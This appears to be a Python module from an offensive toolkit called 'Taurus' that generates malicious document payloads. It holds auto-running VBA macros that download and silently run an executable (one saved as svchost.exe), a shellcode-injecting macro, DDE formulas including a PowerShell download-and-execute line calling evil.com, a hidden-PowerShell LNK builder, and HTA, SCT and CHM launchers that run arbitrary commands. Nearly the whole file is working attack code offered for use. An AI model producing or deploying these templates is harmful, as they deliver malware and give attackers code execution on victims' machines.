"""
Exploit Templates for Taurus
Pre-built templates for common exploitation techniques:
- Office Macros (VBA)
- DDE Exploitation
- LNK File Exploits
- CHM Exploits
- HTA Applications
- SCT Scripts
"""
from typing import Dict, List
from utils.logger import get_logger

logger = get_logger()


class OfficeMacroTemplates:
    """Microsoft Office macro templates"""
    
    @staticmethod
    def generate_vba_macro(payload_url: str, obfuscation_level: int = 5) -> str:
        """
        Generate VBA macro with auto-execution
        
        Args:
            payload_url: URL to download payload
            obfuscation_level: 1-10
        """
        if obfuscation_level >= 7:
            return OfficeMacroTemplates._generate_advanced_macro(payload_url)
        elif obfuscation_level >= 4:
            return OfficeMacroTemplates._generate_medium_macro(payload_url)
        else:
            return OfficeMacroTemplates._generate_basic_macro(payload_url)
    
    @staticmethod
    def _generate_basic_macro(url: str) -> str:
        """Basic VBA macro"""
        return f'''
Sub AutoOpen()
    DownloadAndExecute
End Sub

Sub Document_Open()
    DownloadAndExecute
End Sub

Sub DownloadAndExecute()
    Dim objHTTP As Object
    Dim objStream As Object
    Dim strFile As String
    
    strFile = Environ("TEMP") & "\\update.exe"
    
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objHTTP.Open "GET", "{url}", False
    objHTTP.send
    
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile strFile, 2
    objStream.Close
    
    Shell strFile, vbHide
End Sub
'''
    
    @staticmethod
    def _generate_medium_macro(url: str) -> str:
        """Medium obfuscation VBA macro"""
        return f'''
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
    ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Sub AutoOpen()
    On Error Resume Next
    Dim result As Long
    Dim tempPath As String
    Dim execPath As String
    
    tempPath = Environ("TEMP")
    execPath = tempPath & "\\svchost.exe"
    
    result = URLDownloadToFile(0, "{url}", execPath, 0, 0)
    
    If result = 0 Then
        CreateObject("WScript.Shell").Run execPath, 0, False
    End If
End Sub

Sub Document_Open()
    AutoOpen
End Sub
'''
    
    @staticmethod
    def _generate_advanced_macro(url: str) -> str:
        """Advanced obfuscated VBA macro"""
        return f'''
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xdcku As Long, ByVal Mqnpu As LongPtr, Tqmzo As Long, ByVal Rvfek As Long, Qdmay As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Dgkii As Long, ByVal Inizo As Long, ByVal Wcuav As Long, ByVal Phand As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkpwi As LongPtr, ByRef Jwkby As Any, ByVal Lmywd As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xdcku As Long, ByVal Mqnpu As Long, Tqmzo As Long, ByVal Rvfek As Long, Qdmay As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Dgkii As Long, ByVal Inizo As Long, ByVal Wcuav As Long, ByVal Phand As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkpwi As Long, ByRef Jwkby As Any, ByVal Lmywd As Long) As Long
#End If

Sub AutoOpen()
    Dim Fbqvl As Long, Pjsjz As Variant, Qfbim As Long
#If VBA7 Then
    Dim Tfjle As LongPtr, Rxvud As LongPtr
#Else
    Dim Tfjle As Long, Rxvud As Long
#End If
    
    ' Shellcode would go here (obfuscated)
    Pjsjz = Array(252, 232, 130, 0, 0, 0) ' Truncated for example
    
    Tfjle = VirtualAlloc(0, UBound(Pjsjz), &H3000, &H40)
    
    For Qfbim = LBound(Pjsjz) To UBound(Pjsjz)
        Fbqvl = Pjsjz(Qfbim)
        Rxvud = RtlMoveMemory(Tfjle + Qfbim, Fbqvl, 1)
    Next Qfbim
    
    Rxvud = CreateThread(0, 0, Tfjle, 0, 0, 0)
End Sub

Sub Document_Open()
    AutoOpen
End Sub
'''


class DDEExploitation:
    """DDE (Dynamic Data Exchange) exploitation"""
    
    @staticmethod
    def generate_dde_formula(command: str) -> str:
        """Generate DDE formula for Excel/Word"""
        return f'''
=cmd|'/c {command}'!A1
'''
    
    @staticmethod
    def generate_dde_document() -> str:
        """Generate full DDE exploit document"""
        return '''
DDE Exploitation Template:

1. Excel Formula:
   =MSEXCEL|'\\\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!A1

2. Word Field:
   { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" }

3. Obfuscated:
   { DDEAUTO c:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord.exe\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe "/c powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" }
'''


class LNKExploits:
    """Malicious LNK file generation"""
    
    @staticmethod
    def generate_lnk_template(target: str, icon_path: str = None) -> str:
        """Generate PowerShell script to create malicious LNK"""
        return f'''
# Create Malicious LNK File
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:TEMP\\Document.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command `"IEX(New-Object Net.WebClient).DownloadString('{target}')`""
$Shortcut.IconLocation = "{icon_path or 'C:\\\\Windows\\\\System32\\\\shell32.dll,1'}"
$Shortcut.WorkingDirectory = "$env:TEMP"
$Shortcut.Save()

Write-Host "Malicious LNK created at $env:TEMP\\Document.lnk"
'''


class HTAApplications:
    """HTML Application (HTA) templates"""
    
    @staticmethod
    def generate_hta(payload_url: str) -> str:
        """Generate HTA application"""
        return f'''
<html>
<head>
<title>Loading...</title>
<HTA:APPLICATION
    APPLICATIONNAME="Update"
    SCROLL="no"
    SINGLEINSTANCE="yes"
    WINDOWSTATE="minimize"
/>
<script language="VBScript">
    Sub Window_OnLoad
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")
        
        ' Download and execute
        objShell.Run "powershell -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('{payload_url}')""", 0, False
        
        ' Close HTA
        window.close()
    End Sub
</script>
</head>
<body>
<p>Loading, please wait...</p>
</body>
</html>
'''


class SCTScripts:
    """Scriptlet (SCT) file templates"""
    
    @staticmethod
    def generate_sct(command: str) -> str:
        """Generate SCT scriptlet"""
        return f'''
<?XML version="1.0"?>
<scriptlet>
<registration
    description="Update"
    progid="Update"
    version="1.00"
    classid="{{A1112221-0000-0000-3000-000DA00DABFC}}"
>
<script language="JScript">
    <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("{command}", 0, false);
    ]]>
</script>
</registration>
</scriptlet>
'''


class CHMExploits:
    """Compiled HTML Help (CHM) exploits"""
    
    @staticmethod
    def generate_chm_project() -> str:
        """Generate CHM project file"""
        return '''
[OPTIONS]
Compatibility=1.1 or later
Compiled file=exploit.chm
Contents file=Table of Contents.hhc
Default Window=Main
Default topic=index.html
Display compile progress=No
Language=0x409 English (United States)
Title=Help Documentation

[WINDOWS]
Main="Help","Table of Contents.hhc","index.html","index.html","index.html",,,,,0x23520,,0x387e,,,,,,,,0

[FILES]
index.html
payload.html

[INFOTYPES]
'''
    
    @staticmethod
    def generate_chm_payload_page(command: str) -> str:
        """Generate CHM payload HTML page"""
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Help</title>
</head>
<body>
<h1>Loading Help...</h1>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<PARAM name="Item1" value=",cmd.exe,/c {command}">
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body>
</html>
'''


class ExploitTemplateManager:
    """Manage all exploit templates"""
    
    def __init__(self):
        self.office = OfficeMacroTemplates()
        self.dde = DDEExploitation()
        self.lnk = LNKExploits()
        self.hta = HTAApplications()
        self.sct = SCTScripts()
        self.chm = CHMExploits()
    
    def generate_exploit(self, exploit_type: str, **kwargs) -> str:
        """
        Generate exploit template
        
        Args:
            exploit_type: Type of exploit (macro, dde, lnk, hta, sct, chm)
            **kwargs: Additional parameters
        
        Returns:
            Exploit code/template
        """
        if exploit_type == 'macro':
            url = kwargs.get('url', 'http://example.com/payload.exe')
            level = kwargs.get('obfuscation_level', 5)
            return self.office.generate_vba_macro(url, level)
        
        elif exploit_type == 'dde':
            command = kwargs.get('command', 'calc.exe')
            return self.dde.generate_dde_formula(command)
        
        elif exploit_type == 'lnk':
            target = kwargs.get('target', 'http://example.com/payload.ps1')
            return self.lnk.generate_lnk_template(target)
        
        elif exploit_type == 'hta':
            url = kwargs.get('url', 'http://example.com/payload.ps1')
            return self.hta.generate_hta(url)
        
        elif exploit_type == 'sct':
            command = kwargs.get('command', 'calc.exe')
            return self.sct.generate_sct(command)
        
        elif exploit_type == 'chm':
            command = kwargs.get('command', 'calc.exe')
            return self.chm.generate_chm_payload_page(command)
        
        else:
            logger.warning(f"Unknown exploit type: {exploit_type}")
            return ""
    
    def list_available_exploits(self) -> List[str]:
        """List all available exploit types"""
        return ['macro', 'dde', 'lnk', 'hta', 'sct', 'chm']


# Global instance
_exploit_manager = None


def get_exploit_manager() -> ExploitTemplateManager:
    """Get global exploit template manager"""
    global _exploit_manager
    if _exploit_manager is None:
        _exploit_manager = ExploitTemplateManager()
    return _exploit_manager
